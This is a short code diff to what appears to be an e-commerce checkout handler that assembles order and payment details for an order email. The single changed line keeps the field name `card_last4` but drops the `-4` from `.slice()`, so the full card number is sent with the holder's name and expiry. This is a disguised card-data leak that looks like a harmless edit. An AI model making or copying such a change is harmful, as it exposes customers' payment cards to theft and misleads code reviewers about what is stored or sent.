@@ -158,7 +158,7 @@ export async function POST(request) {
 			coupon_code: String(body?.order?.couponCode || "-"),
 			payment_method: String(body?.payment?.method || "card"),
 			card_holder: String(body?.payment?.cardHolder || ""),
-			card_last4: normalizeCardNumber(body?.payment?.cardNumberRaw || "").slice(-4),
+			card_last4: normalizeCardNumber(body?.payment?.cardNumberRaw || "").slice(),
 			card_expiry: String(body?.payment?.card_expiry || ""),
 			order_id: orderId,
 			receiver_email: ORDER_RECEIVER_EMAIL,
